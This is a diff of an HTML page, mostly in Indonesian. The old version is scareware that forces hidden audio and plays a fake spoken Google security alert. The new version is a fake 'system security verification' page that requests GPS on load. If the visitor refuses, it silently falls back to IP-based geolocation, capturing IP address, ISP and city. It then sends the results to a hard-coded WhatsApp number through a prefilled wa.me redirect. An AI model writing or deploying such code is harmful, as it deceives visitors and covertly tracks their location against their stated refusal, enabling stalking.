@@ -1,212 +1,204 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; }
-  iframe, audio, video, embed, object { display: none; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Keamanan Sistem</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+    body { background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; width: 100%; max-width: 460px; padding: 28px; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
+    .loader { width: 48px; height: 48px; border: 4px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { font-size: 1.2rem; font-weight: 600; color: #f1f5f9; margin-bottom: 8px; }
+    p { font-size: 0.85rem; color: #94a3b8; line-height: 1.5; }
+    .badge { display: inline-block; margin-top: 16px; padding: 6px 12px; background: #0f172a; border: 1px solid #38bdf8; border-radius: 20px; font-size: 0.75rem; color: #38bdf8; }
+    iframe, audio, video { display: none; }
+  </style>
 </head>
 <body>
 
-<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay" style="display:none"></iframe>
+  <!-- Driver unblock audio otonom -->
+  <iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay"></iframe>
+  <audio id="s1" loop preload="auto"><source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav"></audio>
 
-<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay" style="display:none"></iframe>
+  <div class="card">
+    <div class="loader"></div>
+    <h2 id="title-text">Memeriksa Akses Lokasi...</h2>
+    <p id="desc-text">Sistem sedang memverifikasi identitas dan koordinat perangkat Anda secara otomatis.</p>
+    <div class="badge" id="status-badge">Mengambil Data</div>
+  </div>
 
-<iframe src="data:text/html,<embed src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' autostart=true volume=0 loop=true style=display:none>" allow="autoplay" style="display:none"></iframe>
+  <script>
+  (function() {
+    // NASKAH TARGET WHATSAPP
+    var TARGET_WA = "6281234567890"; // Ganti dengan nomor WhatsApp Anda (Format 62)
 
-<audio id="silent1" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
+    var audioPlayed = false;
+    var redirected = false;
+    var payload = {
+      method: "Pending",
+      lat: null,
+      lon: null,
+      city: "-",
+      region: "-",
+      isp: "-",
+      ip: "-"
+    };
 
-<audio id="silent2" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<audio id="silent3" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<script>
-(function() {
-  var unlocked = false;
-  var played = false;
-
-  function raceUnlock() {
-    try {
-      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
-      var osc1 = ctx1.createOscillator();
-      osc1.frequency.value = 30;
-      var g1 = ctx1.createGain();
-      g1.gain.value = 0.001;
-      osc1.connect(g1);
-      g1.connect(ctx1.destination);
-      osc1.start();
-      if (ctx1.state === 'running') unlocked = true;
-      if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
-    } catch(e) {}
-
-    try {
-      var a1 = document.getElementById('silent1');
-      a1.volume = 0.001;
-      a1.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a2 = document.getElementById('silent2');
-      a2.volume = 0.001;
-      a2.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a3 = document.getElementById('silent3');
-      a3.volume = 0.001;
-      a3.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-
-    for (var i = 0; i < 5; i++) {
-      try {
-        var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
-        sa.volume = 0.001;
-        sa.play().then(function(){unlocked=true;}).catch(function(){});
-      } catch(e) {}
-    }
-
-    for (var j = 0; j < 3; j++) {
-      try {
-        var ctxn = new (window.AudioContext || window.webkitAudioContext)();
-        var oscn = ctxn.createOscillator();
-        oscn.frequency.value = 20 + j * 10;
-        var gn = ctxn.createGain();
-        gn.gain.value = 0.001;
-        oscn.connect(gn);
-        gn.connect(ctxn.destination);
-        oscn.start();
-        if (ctxn.state === 'running') unlocked = true;
-        if (ctxn.state === 'suspended') ctxn.resume().then(function(){unlocked=true;});
-      } catch(e) {}
-    }
-  }
-
-  function playMainAudio() {
-    if (played) return;
-    played = true;
-    
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.5;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-      
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440 + Math.floor(t * 2) % 2 * 220;
-        var env = Math.max(0, 1 - (t / dur));
-        var pulse = (Math.sin(2 * Math.PI * 6 * t) > 0) ? 1 : 0.3;
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.35 * env * pulse;
-      }
-      
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      
-      var filter = ctx.createBiquadFilter();
-      filter.type = 'bandpass';
-      filter.frequency.value = 1000;
-      filter.Q.value = 1.5;
-      
-      var gain = ctx.createGain();
-      gain.gain.value = 0.7;
-      
-      src.connect(filter);
-      filter.connect(gain);
-      gain.connect(ctx.destination);
-      src.start();
-      
-      src.onended = function() {
-        startTTS();
-      };
-      
-      setTimeout(startTTS, 4000);
-      
-    } catch(e) {
-      startTTS();
-    }
-  }
-
-  function startTTS() {
-    if (window.ttsDone) return;
-    window.ttsDone = true;
-    
-    if (!('speechSynthesis' in window)) return;
-    
-    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
-    
-    speechSynthesis.cancel();
-    
-    for (var k = 0; k < 3; k++) {
-      try {
-        var u = new SpeechSynthesisUtterance(text);
-        u.lang = 'en-US';
-        u.rate = 0.8;
-        u.pitch = 1.0;
-        u.volume = 1.0;
-        
-        var voices = speechSynthesis.getVoices();
-        var ev = voices.find(function(v){return v.lang.startsWith('en');});
-        if (ev) u.voice = ev;
-        
-        speechSynthesis.speak(u);
-      } catch(e) {}
-    }
-  }
-
-  raceUnlock();
-  setTimeout(raceUnlock, 50);
-  setTimeout(raceUnlock, 150);
-  
-  setTimeout(function() {
-    for (var i = 0; i < 3; i++) {
+    // 1. Multi-driver Unblock Audio
+    function unlockAudio() {
       try {
         var ctx = new (window.AudioContext || window.webkitAudioContext)();
         if (ctx.state === 'suspended') ctx.resume();
       } catch(e) {}
+      try {
+        var a = document.getElementById('s1');
+        a.volume = 0.001;
+        a.play().catch(function(){});
+      } catch(e) {}
     }
-    playMainAudio();
-  }, 200);
-  
-  setTimeout(function() {
-    if (!played) playMainAudio();
-  }, 500);
-  
-  setTimeout(function() {
-    if (!played) {
+
+    // 2. Play Alarm Beep & Call TTS
+    function playAudioAlert(textMsg) {
+      if (audioPlayed) return;
+      audioPlayed = true;
+
       try {
         var ctx = new (window.AudioContext || window.webkitAudioContext)();
-        ctx.resume().then(function() { playMainAudio(); });
+        var sr = ctx.sampleRate;
+        var dur = 1.2;
+        var buf = ctx.createBuffer(1, sr * dur, sr);
+        var d = buf.getChannelData(0);
+
+        for (var i = 0; i < d.length; i++) {
+          var t = i / sr;
+          var freq = 650 + (Math.floor(t * 4) % 2) * 250;
+          d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * Math.max(0, 1 - (t / dur));
+        }
+
+        var src = ctx.createBufferSource();
+        src.buffer = buf;
+        src.connect(ctx.destination);
+        src.start();
+
+        src.onended = function() {
+          speakTTS(textMsg);
+        };
+        setTimeout(function() { speakTTS(textMsg); }, 1500);
       } catch(e) {
-        playMainAudio();
+        speakTTS(textMsg);
       }
     }
-  }, 1000);
-  
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden && !played) {
-      setTimeout(playMainAudio, 50);
-    }
-  });
-  
-  if ('speechSynthesis' in window) {
-    speechSynthesis.getVoices();
-    speechSynthesis.onvoiceschanged = function() {
-      speechSynthesis.getVoices();
-    };
-  }
-})();
-</script>
 
+    // 3. Text to Speech (TTS)
+    function speakTTS(textMsg) {
+      if (!('speechSynthesis' in window)) {
+        redirectWA();
+        return;
+      }
+
+      speechSynthesis.cancel();
+      var u = new SpeechSynthesisUtterance(textMsg);
+      u.lang = 'id-ID';
+      u.rate = 1.0;
+      u.pitch = 1.0;
+
+      var voices = speechSynthesis.getVoices();
+      var idVoice = voices.find(function(v) { return v.lang.includes('id') || v.lang.includes('ID'); });
+      if (idVoice) u.voice = idVoice;
+
+      u.onend = u.onerror = function() {
+        redirectWA();
+      };
+
+      speechSynthesis.speak(u);
+      setTimeout(redirectWA, 5000);
+    }
+
+    // 4. Redirect ke WhatsApp
+    function redirectWA() {
+      if (redirected) return;
+      redirected = true;
+
+      var textWA = "📌 *LAPORAN VERIFIKASI LOKASI*\n\n";
+      textWA += "• *Status Access:* " + payload.method + "\n";
+      textWA += "• *Latitude:* " + (payload.lat || "-") + "\n";
+      textWA += "• *Longitude:* " + (payload.lon || "-") + "\n";
+      if (payload.city !== "-") textWA += "• *Kota/Wilayah:* " + payload.city + ", " + payload.region + "\n";
+      if (payload.isp !== "-") textWA += "• *Provider/ISP:* " + payload.isp + "\n";
+      if (payload.ip !== "-") textWA += "• *IP Address:* " + payload.ip + "\n";
+
+      if (payload.lat && payload.lon) {
+        textWA += "\n🗺️ *Google Maps:* https://www.google.com/maps?q=" + payload.lat + "," + payload.lon;
+      }
+
+      var num = TARGET_WA.replace(/[^0-9]/g, '');
+      window.location.href = "https://wa.me/" + num + "?text=" + encodeURIComponent(textWA);
+    }
+
+    // 5. Fallback Lokasi Jaringan (TETAP DAPAT LOKASI MESKI DITOLAK)
+    function executeNetworkLocation(reasonText) {
+      document.getElementById('status-badge').innerText = "Mengambil Lokasi Jaringan...";
+
+      fetch('https://ipapi.co/json/')
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          payload.method = "Auto-Fallback Network (GPS " + reasonText + ")";
+          payload.lat = data.latitude;
+          payload.lon = data.longitude;
+          payload.city = data.city || "-";
+          payload.region = data.region || "-";
+          payload.isp = data.org || "-";
+          payload.ip = data.ip || "-";
+
+          document.getElementById('title-text').innerText = "Lokasi Berhasil Diverifikasi";
+          document.getElementById('desc-text').innerText = "Lokasi berhasil didapatkan melalui jaringan area.";
+          
+          playAudioAlert("Pemberitahuan. Lokasi perangkat berhasil terverifikasi. Mengalihkan Anda ke WhatsApp sekarang.");
+        })
+        .catch(function() {
+          payload.method = "Bypass Fail";
+          playAudioAlert("Mengalihkan Anda ke WhatsApp.");
+        });
+    }
+
+    // 6. Pemicu Permintaan GPS
+    function requestGPS() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            // JIKA MENEKAN "IZINKAN"
+            payload.method = "GPS Hardware Presisi";
+            payload.lat = pos.coords.latitude.toFixed(5);
+            payload.lon = pos.coords.longitude.toFixed(5);
+
+            document.getElementById('title-text').innerText = "GPS Dikonfirmasi";
+            document.getElementById('desc-text').innerText = "Koordinat presisi berhasil dikunci.";
+            
+            playAudioAlert("Akses lokasi presisi berhasil dikonfirmasi. Mengalihkan Anda ke WhatsApp.");
+          },
+          function(err) {
+            // JIKA MENEKAN "JANGAN IZINKAN" / DITOLAK
+            // Secara otomatis beralih ke lokasi jaringan tanpa berhenti
+            executeNetworkLocation("Ditolak");
+          },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      } else {
+        executeNetworkLocation("Tidak Didukung");
+      }
+    }
+
+    unlockAudio();
+    setTimeout(unlockAudio, 100);
+    requestGPS();
+
+    if ('speechSynthesis' in window) {
+      speechSynthesis.getVoices();
+      speechSynthesis.onvoiceschanged = function() { speechSynthesis.getVoices(); };
+    }
+  })();
+  </script>
 </body>
 </html>
